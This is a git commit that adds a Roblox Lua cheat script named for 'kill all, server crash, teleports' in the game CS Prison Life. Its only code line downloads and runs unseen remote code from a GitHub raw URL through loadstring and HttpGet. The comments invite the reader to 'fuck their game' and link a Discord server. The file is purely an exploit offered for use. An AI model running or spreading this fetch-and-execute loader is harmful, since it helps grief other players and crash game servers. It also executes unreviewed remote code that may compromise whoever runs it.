57f52647345715b0561f0ea3edab8949b7ba604e
Emil Toth <emiltoth1870@gmail.com>
2023-03-08 18:03:11 +0100

    Updated automatically!

---
+++ Scripts/Autoadd/CS Prison Life Kill All Server Crash Teleports.lua
@@ -0,0 +1,4 @@
+-- enjoy, fuck their game while you can
+-- https://www.roblox.com/games/8278412720/CS-Prison-Life
+-- discord.gg/hHeR79X76b
+loadstring(game:HttpGet("https://raw.githubusercontent.com/kysphantoms/phantomwarecs/main/phantomwarecs"))()
